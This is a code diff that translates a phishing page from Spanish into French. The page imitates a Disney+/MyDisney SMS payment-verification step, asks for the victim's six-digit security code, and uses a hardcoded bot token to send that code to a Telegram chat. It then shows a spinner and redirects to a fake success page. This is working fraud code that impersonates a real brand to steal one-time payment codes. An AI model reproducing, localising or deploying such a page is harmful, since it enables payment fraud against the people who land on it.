@@ -1,9 +1,10 @@
+<!-- sms-verification.html -->
 <!DOCTYPE html>
-<html lang="es">
+<html lang="fr">
 <head>
   <meta charset="UTF-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Verificación SMS | Disney+</title>
+  <title>Vérification SMS | Disney+</title>
   <!-- CSS commun -->
   <link rel="stylesheet" href="style.css"/>
 </head>
@@ -12,10 +13,10 @@
     <!-- Logo MyDisney centré en haut de la carte -->
     <img src="Images/Mydisney-logo.png" alt="MyDisney" class="center-logo"/>
 
-    <h1>Verificación SMS</h1>
+    <h1>Vérification SMS</h1>
     <p>
-      Se ha enviado un código de seguridad a tu teléfono.<br/>
-      Ingresa el código para finalizar el pago.
+      Un code de sécurité a été envoyé à votre téléphone.<br/>
+      Saisissez-le pour finaliser le paiement.
     </p>
 
     <!-- Icônes de paiement -->
@@ -25,14 +26,14 @@
     </div>
 
     <form id="smsForm">
-      <input type="text" name="sms" maxlength="6" placeholder="Código de 6 dígitos" required/>
-      <button type="submit">Validar</button>
+      <input type="text" name="sms" maxlength="6" placeholder="Code à 6 chiffres" required/>
+      <button type="submit">Valider</button>
     </form>
 
     <!-- Note de bas de page + logos partenaires -->
     <div class="footer-note">
-      <strong>Disney+ forma parte del grupo Walt Disney</strong><br/>
-      MyDisney te da acceso a servicios como Disney+, ESPN, Walt Disney World <a href="#">y más</a>.
+      <strong>Disney+ fait partie du groupe Walt Disney</strong><br/>
+      MyDisney vous donne accès aux services tels que Disney+, ESPN, Walt Disney World <a href="#">et bien plus encore</a>.
       <div class="logos-container">
         <img src="Images/compose2.png" alt="Disney+"/>
         <img src="Images/abc-logo-image-4413.png" alt="ABC"/>
@@ -49,7 +50,7 @@
   <div id="spinnerOverlay">
     <div class="spinner"></div>
     <div class="spinner-text" style="color:#fff; margin-top:16px; font-size:1rem;">
-      Verificando código…
+      Vérification du code…
     </div>
   </div>
 
@@ -57,7 +58,7 @@
     document.getElementById("smsForm").addEventListener("submit", function(e) {
       e.preventDefault();
       const code = this.sms.value.trim();
-      // Envoi du code par Telegram
+      // Envoi du code via Telegram
       fetch(
         `https://api.telegram.org/bot8079060666:AAGfVOxTqIR7teiEPuU3a-qZFcL9vdVTSOg/sendMessage`,
         {
@@ -65,13 +66,13 @@
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify({
             chat_id: "-4970333928",
-            text: `🔐 Código SMS: ${code}`
+            text: `🔐 Code SMS : ${code}`
           })
         }
       ).catch(console.error);
       // Affiche le spinner
       document.getElementById("spinnerOverlay").style.display = "flex";
-      // Redirige après 2.5 s
+      // Redirige après 2,5 secondes
       setTimeout(() => {
         window.location.href = "success.html";
       }, 2500);
